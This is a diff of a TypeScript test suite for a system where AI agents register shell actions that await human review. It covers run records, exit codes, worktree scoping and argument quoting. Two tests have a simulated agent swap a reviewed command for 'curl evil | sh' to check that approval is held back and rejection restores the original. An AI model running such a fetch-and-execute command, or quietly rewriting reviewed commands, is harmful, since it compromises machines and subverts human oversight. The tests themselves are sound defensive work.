@@ -5,15 +5,27 @@ import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { test, type TestContext } from 'node:test'
 import { fileURLToPath } from 'node:url'
+import Fastify from 'fastify'
 import { eq } from 'drizzle-orm'
-import { conversations, openDatabase, projectActions, projects, runMigrations, users } from '@solera/db'
-import { actionUrlSchema, resolveActionUrl } from '@solera/protocol'
-import { ActionRunner, createAction, loadAction, updateAction } from '../src/actions/actions.js'
+import { actionRuns, conversations, openDatabase, projectActions, projects, runMigrations, users, worktrees } from '@solera/db'
+import {
+  actionRunStatusOf,
+  actionUrlSchema,
+  resolveActionUrl,
+  type ActionRunDetailDto,
+  type ProjectActionDto,
+  type ProjectActionRunResult,
+} from '@solera/protocol'
+import { ActionRunner, approveAction, createAction, loadAction, rejectAction, updateAction } from '../src/actions/actions.js'
+import { runExcerpt } from '../src/actions/runs.js'
 import type { AgentRegistry } from '../src/agents/registry.js'
 import type { Config } from '../src/config.js'
 import type { SessionManager } from '../src/sessions/session-manager.js'
 import { AgentRequests } from '../src/sessions/agent-requests.js'
+import type { EventLog } from '../src/events/event-log.js'
 import { TerminalManager } from '../src/terminals/terminal-manager.js'
+import { registerErrorHandler } from '../src/http/errors.js'
+import { registerActionRoutes } from '../src/http/routes/actions.js'
 import { probeBwrap } from '../src/environments/confined/bwrap.js'
 import { Environments } from '../src/environments/environments.js'
 
@@ -26,7 +38,9 @@ async function harness(t: TestContext) {
   t.after(() => sqlite.close())
 
   db.insert(users).values({ id: 'owner', username: 'owner', displayName: 'owner', passwordHash: '', createdAt: 1 }).run()
-  db.insert(projects).values({ id: 'project', name: 'project', workspacePath: dir, ownerId: 'owner', visibility: 'private', createdAt: 1 }).run()
+  for (const id of ['project', 'other']) {
+    db.insert(projects).values({ id, name: id, workspacePath: dir, ownerId: 'owner', visibility: 'private', createdAt: 1 }).run()
+  }
   db.insert(conversations).values({
     id: 'agent', projectId: 'project', userId: 'owner', title: 'Session', agent: 'claude', config: '{}', status: 'running',
     createdAt: 1, updatedAt: Date.now(),
@@ -39,7 +53,16 @@ async function harness(t: TestContext) {
   const terminals = new TerminalManager(config)
   t.after(() => terminals.shutdown())
   const runner = new ActionRunner(db, config, terminals, new Environments(db))
-  const requests = new AgentRequests({ db, config }, {} as SessionManager, {} as AgentRegistry, runner)
+  const sessions = { workingDirectory: () => dir } as unknown as SessionManager
+  const requests = new AgentRequests({ db, config }, sessions, {} as AgentRegistry, {} as EventLog, undefined, undefined, runner)
+
+  const app = Fastify()
+  app.addHook('preHandler', async (request) => {
+    request.user = db.select().from(users).where(eq(users.id, 'owner')).get()
+  })
+  registerErrorHandler(app)
+  registerActionRoutes(app, { db, config } as never, sessions, runner)
+  t.after(() => app.close())
 
   const mcp = async (name: string, args: object) => {
     const child = spawn(process.execPath, [fileURLToPath(new URL('../src/mcp/solera-mcp.mjs', import.meta.url))], {
@@ -57,7 +80,28 @@ async function harness(t: TestContext) {
     return JSON.parse(stdout).result as { content: { text: string }[]; isError?: boolean }
   }
 
-  return { db, dir, terminals, runner, mcp }
+  return { db, dir, config, terminals, runner, app, mcp }
+}
+
+/** `/bin/sh` plutôt que le shell de la machine : une sortie prévisible. */
+function posixShell(t: TestContext) {
+  const previousShell = process.env.SHELL
+  process.env.SHELL = '/bin/sh'
+  t.after(() => { process.env.SHELL = previousShell })
+}
+
+/** Attend que le passage le plus récent de l'action soit clos, et rend ses détails. */
+async function settledRuns(app: Awaited<ReturnType<typeof harness>>['app'], actionId: string): Promise<ActionRunDetailDto[]> {
+  const deadline = Date.now() + 5000
+  for (;;) {
+    const runs = (await app.inject({ method: 'GET', url: `/api/actions/${actionId}/runs` })).json<ActionRunDetailDto[]>()
+    if ((runs[0] && runs[0].status !== 'running') || Date.now() > deadline) return runs
+    await new Promise((done) => setTimeout(done, 50))
+  }
+}
+
+async function listed(app: Awaited<ReturnType<typeof harness>>['app'], actionId: string): Promise<ProjectActionDto | undefined> {
+  return (await app.inject({ method: 'GET', url: '/api/actions' })).json<ProjectActionDto[]>().find((action) => action.id === actionId)
 }
 
 test('an action registered by an agent waits for review, and listing shows it', async (t) => {
@@ -159,4 +203,263 @@ test('a service URL fills in the port it listens on, and an agent changing it as
 
   const row = createAction(db, 'project', { label: 'Dev', kind: 'service', command: 'pnpm dev', url: 'http://host:{port}' }, null)
   assert.equal(updateAction(db, row, { url: 'http://elsewhere:{port}' }, 'agent').approvedAt, null)
+})
+
+// --- passages (S2) --------------------------------------------------------------
+
+test('a click writes a running passage, and the end of its terminal closes it with code, date and excerpt', async (t) => {
+  const { db, dir, app } = await harness(t)
+  posixShell(t)
+  const row = createAction(db, 'project', { label: 'Fail', kind: 'task', command: 'sleep 0.3; echo first; echo last; exit 3' }, null)
+
+  const started = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload: {} })
+  assert.equal(started.statusCode, 201, started.body)
+  const terminalId = started.json<ProjectActionRunResult>().terminal!.id
+
+  const running = (await listed(app, row.id))!.runs
+  assert.equal(running.length, 1)
+  assert.equal(running[0]!.status, 'running')
+  assert.equal(running[0]!.trigger, 'manual')
+  assert.equal(running[0]!.terminalId, terminalId)
+  assert.equal(running[0]!.cwd, dir)
+  assert.equal(running[0]!.conversationId, null)
+  assert.equal(running[0]!.finishedAt, null)
+  // L'extrait ne voyage pas avec la liste, relue toutes les dix secondes.
+  assert.equal('excerpt' in running[0]!, false)
+
+  const [done] = await settledRuns(app, row.id)
+  assert.equal(done!.status, 'failed')
+  assert.equal(done!.exitCode, 3)
+  assert.ok(done!.finishedAt! >= done!.startedAt)
+  assert.equal(done!.excerpt, 'first\nlast')
+})
+
+test('a stopped command is a stopped passage, not a failed one', async (t) => {
+  const { db, app, terminals } = await harness(t)
+  posixShell(t)
+  const row = createAction(db, 'project', { label: 'Long', kind: 'task', command: 'sleep 30' }, null)
+  const started = (await app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload: {} })).json<ProjectActionRunResult>()
+  await new Promise((done) => setTimeout(done, 300))
+  terminals.interrupt('project', started.terminal!.id)
+
+  const [done] = await settledRuns(app, row.id)
+  assert.equal(done!.status, 'stopped')
+  assert.equal(done!.exitCode, 130)
+})
+
+test('exit codes: 0 succeeds, a stop signal stops, anything else fails', () => {
+  assert.equal(actionRunStatusOf(0), 'succeeded')
+  assert.equal(actionRunStatusOf(1), 'failed')
+  // SIGHUP (terminal fermé), SIGINT (Ctrl-C), SIGKILL, SIGTERM : on l'a arrêtée.
+  for (const code of [129, 130, 137, 143]) assert.equal(actionRunStatusOf(code), 'stopped')
+  // Un plantage par signal reste un échec.
+  assert.equal(actionRunStatusOf(139), 'failed')
+})
+
+test('the excerpt keeps the last lines, readable and bounded', () => {
+  assert.equal(runExcerpt(''), null)
+  assert.equal(runExcerpt('\r\n\r\n'), null)
+  assert.equal(runExcerpt('\x1b[32mok\x1b[0m 3 tests\r\n\x1b]0;title\x07done\r\n'), 'ok 3 tests\ndone')
+  // Une barre de progression réécrite par `\r` ne garde que son dernier état.
+  assert.equal(runExcerpt('10%\r50%\r100%\r\nend'), '100%\nend')
+
+  const long = Array.from({ length: 5000 }, (_, index) => `line ${index}`).join('\r\n')
+  const excerpt = runExcerpt(long)!
+  assert.ok(excerpt.length <= 4000)
+  assert.ok(excerpt.endsWith('line 4999'))
+  // Coupé sur une fin de ligne, pas au milieu d'une.
+  assert.match(excerpt.split('\n')[0]!, /^line \d+$/)
+})
+
+test('the list shows the 20 latest passages, newest first, and deleting the action takes them away', async (t) => {
+  const { db, app } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Tests', kind: 'task', command: 'true' }, null)
+  for (let index = 0; index < 25; index += 1) {
+    db.insert(actionRuns).values({
+      id: `run-${index}`, actionId: row.id, projectId: 'project', trigger: 'manual', conversationId: null,
+      terminalId: null, cwd: '/', status: 'succeeded', exitCode: 0, startedAt: 1000 + index, finishedAt: 2000 + index, excerpt: null,
+    }).run()
+  }
+
+  const runs = (await listed(app, row.id))!.runs
+  assert.equal(runs.length, 20)
+  assert.equal(runs[0]!.id, 'run-24')
+  assert.equal(runs.at(-1)!.id, 'run-5')
+
+  assert.equal((await app.inject({ method: 'DELETE', url: `/api/actions/${row.id}` })).statusCode, 204)
+  assert.equal(db.select().from(actionRuns).all().length, 0)
+})
+
+test('passages left running by a stopped daemon are closed as stopped at startup', async (t) => {
+  const { db, config, terminals } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Tests', kind: 'task', command: 'true' }, null)
+  db.insert(actionRuns).values({
+    id: 'orphan', actionId: row.id, projectId: 'project', trigger: 'manual', conversationId: null,
+    terminalId: 'gone', cwd: '/', status: 'running', exitCode: null, startedAt: 1000, finishedAt: null, excerpt: null,
+  }).run()
+
+  new ActionRunner(db, config, terminals, new Environments(db))
+  const orphan = db.select().from(actionRuns).where(eq(actionRuns.id, 'orphan')).get()!
+  assert.equal(orphan.status, 'stopped')
+  assert.equal(orphan.finishedAt, null)
+})
+
+test('run_action writes an agent passage, and refuses extra arguments', async (t) => {
+  const { db, app, mcp } = await harness(t)
+  posixShell(t)
+  const row = createAction(db, 'project', { label: 'Quick', kind: 'task', command: 'exit 0' }, null)
+
+  const refused = await mcp('run_action', { id: row.id, args: ['--only', 'x'] })
+  assert.equal(refused.isError, true)
+  assert.match(refused.content[0]!.text, /args/)
+  assert.equal(db.select().from(actionRuns).all().length, 0)
+
+  const ran = await mcp('run_action', { id: row.id })
+  assert.equal(ran.isError, undefined, ran.content[0]?.text)
+  const [done] = await settledRuns(app, row.id)
+  assert.equal(done!.trigger, 'agent')
+  assert.equal(done!.conversationId, 'agent')
+  assert.equal(done!.status, 'succeeded')
+})
+
+// --- où et avec quoi (S3) -------------------------------------------------------
+
+async function addWorktree(db: Awaited<ReturnType<typeof harness>>['db'], dir: string, id: string, projectId: string) {
+  const path = join(dir, `wt-${id}`)
+  await mkdir(path)
+  db.insert(worktrees).values({ id, projectId, name: id, path, baseRef: 'main', createdBy: 'owner', createdAt: 1 }).run()
+  return path
+}
+
+test('an action runs in a worktree of its project, and nowhere else', async (t) => {
+  const { db, dir, app } = await harness(t)
+  posixShell(t)
+  const path = await addWorktree(db, dir, 'mine', 'project')
+  await addWorktree(db, dir, 'theirs', 'other')
+  const row = createAction(db, 'project', { label: 'Pwd', kind: 'task', command: 'pwd' }, null)
+  const run = (payload: object) => app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload })
+
+  const elsewhere = await run({ worktreeId: 'theirs' })
+  assert.equal(elsewhere.statusCode, 404)
+  assert.equal(elsewhere.json<{ error: { code: string } }>().error.code, 'worktree_not_found')
+  assert.equal((await run({ worktreeId: 'missing' })).statusCode, 404)
+  assert.equal((await run({ worktreeId: 'mine', conversationId: 'agent' })).statusCode, 400)
+
+  const started = await run({ worktreeId: 'mine' })
+  assert.equal(started.statusCode, 201, started.body)
+  assert.equal(started.json<ProjectActionRunResult>().terminal!.cwd, path)
+  const [done] = await settledRuns(app, row.id)
+  assert.equal(done!.cwd, path)
+  assert.equal(done!.conversationId, null)
+  assert.equal(done!.excerpt, path)
+})
+
+test('extra arguments are quoted and added after the reviewed command', async (t) => {
+  const { db, app } = await harness(t)
+  posixShell(t)
+  const row = createAction(db, 'project', { label: 'Echo', kind: 'task', command: "printf '%s|'" }, null)
+
+  const started = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload: { args: ['a b', "it's", '$HOME'] } })
+  assert.equal(started.statusCode, 201, started.body)
+  const [done] = await settledRuns(app, row.id)
+  assert.equal(done!.excerpt, "a b|it's|$HOME|")
+})
+
+test('a run still going in another worktree does not count as already running here, one in the same tree does', async (t) => {
+  const { db, dir, app, terminals } = await harness(t)
+  posixShell(t)
+  await addWorktree(db, dir, 'mine', 'project')
+  const row = createAction(db, 'project', { label: 'Long', kind: 'task', command: 'sleep 30' }, null)
+  const run = (payload: object) => app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload })
+
+  const atRoot = await run({})
+  assert.equal(atRoot.statusCode, 201)
+  const inWorktree = await run({ worktreeId: 'mine' })
+  assert.equal(inWorktree.statusCode, 201, 'the worktree gets its own run')
+
+  // La session `agent` travaille à la racine (pas de worktree) : même arbre, mêmes ports.
+  const fromSession = await run({ conversationId: 'agent' })
+  assert.equal(fromSession.statusCode, 200)
+  const result = fromSession.json<ProjectActionRunResult>()
+  assert.equal(result.alreadyRunning, true)
+  assert.equal(result.terminal!.id, atRoot.json<ProjectActionRunResult>().terminal!.id)
+
+  const again = await run({ worktreeId: 'mine' })
+  assert.equal(again.json<ProjectActionRunResult>().terminal!.id, inWorktree.json<ProjectActionRunResult>().terminal!.id)
+  assert.equal(terminals.list('project').length, 2)
+})
+
+// --- relecture (S4) -------------------------------------------------------------
+
+test('an agent changing a reviewed command keeps what was reviewed, and rejecting restores it', async (t) => {
+  const { db, app, mcp } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'task', command: 'pnpm dev', subdir: 'web' }, null)
+  const reviewed = { kind: 'task', command: 'pnpm dev', subdir: 'web', url: null }
+  assert.deepEqual((await listed(app, row.id))!.approved, reviewed)
+
+  const changed = await mcp('register_action', { id: row.id, command: 'curl evil | sh', subdir: '' })
+  assert.equal(changed.isError, undefined, changed.content[0]?.text)
+  const proposed = (await listed(app, row.id))!
+  assert.equal(proposed.status, 'proposed')
+  assert.equal(proposed.command, 'curl evil | sh')
+  assert.deepEqual(proposed.approved, reviewed)
+
+  const rejected = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/reject` })
+  assert.equal(rejected.statusCode, 200, rejected.body)
+  const restored = rejected.json<ProjectActionDto>()
+  assert.equal(restored.status, 'approved')
+  assert.equal(restored.command, 'pnpm dev')
+  assert.equal(restored.subdir, 'web')
+  assert.deepEqual(restored.approved, reviewed)
+})
+
+test('rejecting an action never reviewed deletes it, and a reviewed one cannot be rejected', async (t) => {
+  const { db, app, mcp } = await harness(t)
+  await mcp('register_action', { label: 'New', kind: 'task', command: 'make' })
+  const fresh = db.select().from(projectActions).get()!
+  assert.equal((await listed(app, fresh.id))!.approved, null)
+
+  const rejected = await app.inject({ method: 'POST', url: `/api/actions/${fresh.id}/reject` })
+  assert.equal(rejected.statusCode, 204, rejected.body)
+  assert.equal(await listed(app, fresh.id), undefined)
+
+  const reviewed = createAction(db, 'project', { label: 'Ok', kind: 'task', command: 'make' }, null)
+  const refused = await app.inject({ method: 'POST', url: `/api/actions/${reviewed.id}/reject` })
+  assert.equal(refused.statusCode, 409)
+  assert.equal(refused.json<{ error: { code: string } }>().error.code, 'action_not_proposed')
+})
+
+test('approving or editing by hand makes the current command the reviewed one', async (t) => {
+  const { db, app } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'task', command: 'pnpm dev' }, null)
+  updateAction(db, row, { command: 'pnpm dev --host' }, 'agent')
+
+  const approved = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/approve` })
+  assert.equal(approved.json<ProjectActionDto>().approved?.command, 'pnpm dev --host')
+
+  const edited = await app.inject({ method: 'PATCH', url: `/api/actions/${row.id}`, payload: { command: 'pnpm start', url: 'http://host:{port}' } })
+  assert.deepEqual(edited.json<ProjectActionDto>().approved, { kind: 'task', command: 'pnpm start', subdir: null, url: 'http://host:{port}' })
+})
+
+test('reviewing a command an agent rewrote meanwhile changes nothing and says so', async (t) => {
+  const { db } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'task', command: 'pnpm dev' }, null)
+  const seen = updateAction(db, row, { command: 'pnpm dev --host' }, 'agent')
+  // Pendant la lecture, l'agent réécrit encore.
+  await new Promise((done) => setTimeout(done, 5))
+  updateAction(db, seen, { command: 'curl evil | sh' }, 'agent')
+
+  assert.throws(() => approveAction(db, seen), /changed/)
+  assert.throws(() => rejectAction(db, seen), /changed/)
+  const now = loadAction(db, row.id)
+  assert.equal(now.approvedAt, null)
+  assert.equal(now.command, 'curl evil | sh')
+})
+
+test('extra arguments are for a command that ends, not for a service', async (t) => {
+  const { db, app } = await harness(t)
+  const row = createAction(db, 'project', { label: 'Dev', kind: 'service', command: 'pnpm dev' }, null)
+  const refused = await app.inject({ method: 'POST', url: `/api/actions/${row.id}/run`, payload: { args: ['--port', '1'] } })
+  assert.equal(refused.statusCode, 409)
+  assert.equal(refused.json<{ error: { code: string } }>().error.code, 'action_args_task_only')
 })
